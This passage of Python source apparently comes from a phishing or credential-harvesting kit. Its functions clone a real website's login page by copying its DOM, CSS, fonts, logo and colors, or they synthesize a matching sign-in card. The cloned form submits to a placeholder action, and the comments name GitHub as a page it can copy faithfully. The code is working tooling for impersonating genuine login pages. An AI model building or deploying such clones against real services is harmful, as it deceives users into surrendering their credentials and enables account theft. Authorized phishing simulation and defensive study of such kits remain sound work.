.dj-btn-arrow {{ width: 18px; height: 18px; }}
.dj-divider {{ display: flex; align-items: center; gap: 16px; margin: 8px 0; }}
.dj-divider::before, .dj-divider::after {{ content: ""; flex: 1; height: 1px; background: var(--dj-divider); }}
.dj-divider span {{ font-size: 12px; text-transform: uppercase; letter-spacing: 0.05em; color: var(--dj-text-subtle); font-weight: 500; }}
.dj-sso-button {{
  width: 100%; padding: 14px 16px; font-size: 14px; font-weight: 500; color: var(--dj-text-subtle);
  background: rgba(255,255,255,0.01); border: 1px solid rgba(255,255,255,0.04);
  border-radius: 12px; cursor: not-allowed; display: flex; align-items: center; justify-content: center; gap: 8px;
}}
.dj-sso-button svg {{ width: 18px; height: 18px; }}
.dj-footer {{ text-align: center; margin-top: 32px; font-size: 11px; color: var(--dj-text-subtle); }}
.dj-disclaimer {{
  display: flex; align-items: flex-start; gap: 8px; padding: 12px 14px;
  border-radius: 12px; border: 1px solid {disclaimer_border}; background: {disclaimer_bg};
  margin-top: 32px; font-size: 12px; line-height: 1.5; color: {disclaimer_text_color};
}}
.dj-disclaimer svg {{ flex-shrink: 0; width: 16px; height: 16px; margin-top: 1px; color: {disclaimer_icon_color}; }}
{panel_css}
{css or ""}
{dynamic_css}"""

    # ---- HTML body -----------------------------------------------------------
    html_class = ' class="dark"' if is_dark else ""
    body_parts = []
    brand_esc = _html_mod.escape(brand_name, True)
    title_esc = _html_mod.escape(title, True)

    if is_dark and not extracted_form:
        # ---- Two-panel dark SPA layout ---------------------------------------
        left_logo = ""
        if logo_src:
            left_logo = f'        {logo_html}\n'
        else:
            left_logo = (
                f'        <svg viewBox="0 0 80 80" class="dj-logo" style="width:96px;height:96px" aria-hidden="true">'
                f'<defs><linearGradient id="lg" x1="0%" y1="0%" x2="100%" y2="100%">'
                f'<stop offset="0%" stop-color="{primary}"/><stop offset="100%" stop-color="{secondary}"/></linearGradient></defs>'
                f'<path d="M40 4 L72 16 L72 36 C72 56 56 72 40 78 C24 72 8 56 8 36 L8 16 Z" fill="url(#lg)"/>'
                f'<path d="M40 11 L66 21 L66 36 C66 53 53 66 40 71 C27 66 14 53 14 36 L14 21 Z" fill="#0a0a0c"/>'
                f'<circle cx="40" cy="38" r="12" fill="none" stroke="#ffffff" stroke-width="1.5" opacity="0.3"/>'
                f'<circle cx="40" cy="38" r="5" fill="none" stroke="#ffffff" stroke-width="1.5" opacity="0.5"/>'
                f'<circle cx="40" cy="38" r="2" fill="#ffffff"/></svg>\n'
            )

        # Dynamic tagline: extracted text, or empty (omit the <p>).
        tagline_html = ""
        if tagline:
            tagline_html = f'        <p class="dj-tagline">{_html_mod.escape(tagline, True)}</p>\n'

        # Dynamic CTA box: only shown when there's content to display.
        # For now we only include it if there's a tagline + subtitle combo.
        cta_html = ""
        if subtitle:
            cta_html = (
                f'        <div class="dj-cta-box">\n'
                f'          <p class="dj-cta-muted">{_html_mod.escape(subtitle, True)}</p>\n'
                f'          <p class="dj-cta-strong">{_html_mod.escape(brand_esc, True)}</p>\n'
                f'        </div>\n'
            )

        # Heading on right panel: use extracted heading or default.
        right_heading = "Sign in"
        right_sub = "Sign in to continue"
        if heading:
            parts = heading.split(" | ")
            if len(parts) >= 1 and len(parts[0]) < 60:
                right_heading = parts[0]
            if len(parts) >= 2 and len(parts[1]) < 100:
                right_sub = parts[1]
            elif subtitle:
                right_sub = subtitle

        body_parts.append(f"""\
<body>
<div class="dj-container">
  <div class="dj-card">
    <div class="dj-panels">
      <div class="dj-panel-left">
{left_logo}\
        <h1 class="dj-brand-name"><span class="dj-brand-primary">{brand_esc}</span></h1>
{tagline_html}{cta_html}\
      </div>
      <div class="dj-panel-right">
        <h2 class="dj-title">{_html_mod.escape(right_heading, True)}</h2>
        <p class="dj-subtitle">{_html_mod.escape(right_sub, True)}</p>
        <form class="dj-form" action="{FORM_ACTION_PLACEHOLDER}" method="POST" autocomplete="on">
          {form_block}
        </form>
        {sso_block}
        <p class="dj-footer">&copy; {footer_year} &mdash; Authorized access only.</p>
      </div>
    </div>
  </div>
</div>
{dynamic_js}
</body>""")

    elif extracted_form:
        # ---- Preserved real form layout --------------------------------------
        disc_html = ""
        if disclaimer_text:
            disc_html = (
                '<div class="dj-disclaimer">'
                '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"><path d="M20 13c0 5-3.5 7.5-7.66 8.95a1 1 0 0 1-.67-.01C7.5 20.5 4 18 4 13V6a1 1 0 0 1 1-1c2 0 4.5-1.2 6.24-2.72a1.17 1.17 0 0 1 1.52 0C14.51 3.81 17 5 19 5a1 1 0 0 1 1 1z"/><path d="M12 8v4"/><path d="M12 16h.01"/></svg>'
                f'<span>{_html_mod.escape(disclaimer_text, True)}</span>'
                '</div>'
            )

        form_heading = "Sign in"
        if heading and " | " in heading:
            form_heading = heading.split(" | ", 1)[0]
        form_sub = subtitle or "Please sign in to continue"

        body_parts.append(f"""\
<body>
<div class="dj-container">
  <div class="dj-card">
    <div class="dj-panel-right" style="padding:48px 40px">
      {logo_html}
      <h2 class="dj-title">{_html_mod.escape(form_heading, True)}</h2>
      <p class="dj-subtitle">{_html_mod.escape(form_sub, True)}</p>
      <form class="dj-form" action="{FORM_ACTION_PLACEHOLDER}" method="POST" autocomplete="on">
        {form_block}
      </form>
      <p class="dj-footer">&copy; {footer_year} &mdash; Authorized access only.</p>
      {disc_html}
    </div>
  </div>
</div>
{dynamic_js}
</body>""")

    else:
        # ---- Light / unknown — centered card ----------------------------------
        card_title = title_esc or "Sign in"
        card_sub = subtitle or "Sign in to continue"

        body_parts.append(f"""\
<body>
<div class="dj-container">
  <div class="dj-card">
    <div style="padding:48px 40px">
      {logo_html}
      <h1 class="dj-title">{card_title}</h1>
      <p class="dj-subtitle">{_html_mod.escape(card_sub, True)}</p>
      <form class="dj-form" action="{FORM_ACTION_PLACEHOLDER}" method="POST" autocomplete="on">
        {form_block}
      </form>
      <p class="dj-footer">&copy; {footer_year} &mdash; Authorized access only.</p>
    </div>
  </div>
</div>
{dynamic_js}
</body>""")

    body_html = "".join(body_parts)

    template = f"""<!DOCTYPE html>
<html lang="en"{html_class}>
<head>
<meta charset="utf-8" />
<meta name="viewport" content="width=device-width, initial-scale=1.0" />
<title>{title}</title>
{fonts_links}
<style>
{css_block}
</style>
</head>
{body_html}
</html>"""
    return template


def _build_login_template(
    html: str = "",
    css: str = "",
    logo_url: str = "",
    favicon_url: str = "",
    colors: Optional[Dict[str, str]] = None,
    theme: str = "unknown",
    fonts: Optional[List[str]] = None,
    base_url: str = "",
    session: Optional[requests.Session] = None,
) -> Tuple[str, bool]:
    """Build the best possible self-contained clone.

    First tries to preserve the target's real login-page DOM; if that fails
    (SPA, empty body, etc.) it falls back to a generated adaptive card.
    In both cases the result is layered with fluid CSS animations and a
    small JS interactivity bundle.

    Returns ``(template_html, preserved_original_dom)``.
    """
    colors = colors or {}
    fonts = fonts or []
    is_dark = theme == "dark"
    primary = colors.get("primary") or ("#ef4444" if is_dark else "#2563eb")
    raw_bg = colors.get("background") or ""
    if raw_bg and is_dark:
        bg_lum = _relative_luminance(raw_bg)
        if bg_lum is not None and bg_lum > 0.5:
            raw_bg = ""
    page_bg = raw_bg or ("#0a0a0f" if is_dark else "#f3f4f6")
    text_color = "#ffffff" if is_dark else "#111827"
    title = _infer_title(html)

    # Try to preserve the original page structure.  This gives a far more
    # faithful visual clone than synthesizing a card from scratch.
    preserved = _preserve_original_page(html, base_url, session)
    if preserved is not None:
        logger.info("Preserving original login-page DOM for %s", base_url)
        fonts_css = _inline_fonts(fonts, base_url, session)
        dynamic_css = _build_dynamic_css(primary, is_dark)
        dynamic_js = _build_dynamic_js()
        fragment_html = str(preserved)
        # Many modern pages (GitHub, etc.) gate their color scheme behind
        # data-* attributes or CSS variables.  Add a safe fallback so the
        # clone still renders with the detected theme even after scripts are
        # stripped and attributes are missing.
        fallback_css = f""":root {{ --dj-page-bg: {page_bg}; --dj-text: {text_color}; }}
html, body {{ min-height: 100%; }}
body {{ background-color: var(--bgColor-default, var(--dj-page-bg)); color: var(--fgColor-default, var(--dj-text)); }}"""
        template = f"""<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8" />
<meta name="viewport" content="width=device-width, initial-scale=1.0" />
<title>{_html_mod.escape(title, True)}</title>
<style>
/* Inlined target CSS */
{css}
/* Inlined fonts */
{fonts_css}
/* Fluid dynamic layer */
{dynamic_css}
/* Theme fallback for script-stripped clones */
{fallback_css}
</style>
</head>
<body>
{fragment_html}
{dynamic_js}
</body>
</html>"""
        return template, True

    # Fallback: synthesize an adaptive card from extracted colors/text.
    logger.info("Falling back to generated adaptive card for %s", base_url)
    fallback = _build_fallback_template(
        html=html,
        css=css,
        logo_url=logo_url,
        favicon_url=favicon_url,
        colors=colors,
        theme=theme,
        fonts=fonts,
        base_url=base_url,
    )
    return fallback, False


def _infer_title(html: str) -> str:
    """Best-effort page-title extraction from the original HTML."""
    soup = BeautifulSoup(html or "", "html.parser")
    if soup.title and soup.title.string:
        return soup.title.string.strip()
    og_title = soup.find("meta", property="og:title")
    if og_title and og_title.get("content"):
        return og_title["content"].strip()
    h1 = soup.find("h1")
    if h1:
        return h1.get_text(" ", strip=True)
    return "Sign in"


# --- Helpers -----------------------------------------------------------------

def _persist_asset(
    url: str,
    output_dir: str,
    name: str,
    session: Optional[requests.Session] = None,
) -> None:
    """Download a binary asset (logo/favicon) into ``output_dir``.

    The file extension is inferred from the URL path or Content-Type header.
    Failures are logged and ignored (best-effort).
    """
    data = _fetch_bytes(url, session)
    if not data:
        logger.debug("Skipping asset persist (no data): %s", url)
        return
    ext = _guess_extension(url, data)
    path = os.path.join(output_dir, f"{name}{ext}")
    try:
        with open(path, "wb") as fh:
            fh.write(data)
        logger.debug("Persisted asset %s -> %s", url, path)
    except OSError as exc:
        logger.warning("Could not write asset %s: %s", path, exc)


def _guess_extension(url: str, data: bytes) -> str:
    """Guess a file extension from the URL path or content magic bytes."""
    path = urlparse(url).path.lower()
    for ext in (".png", ".jpg", ".jpeg", ".svg", ".ico", ".webp", ".gif"):
        if path.endswith(ext):
            return ext
    # Magic-byte sniff for common image types.
    if data.startswith(b"\x89PNG"):
        return ".png"
    if data.startswith(b"\xff\xd8\xff"):
        return ".jpg"
    if data.startswith(b"GIF8"):
        return ".gif"
    if b"<svg" in data[:512]:
        return ".svg"
    if data.startswith(b"\x00\x00\x01\x00"):
        return ".ico"
    if data.startswith(b"RIFF") and data[8:12] == b"WEBP":
        return ".webp"
    return ".bin"
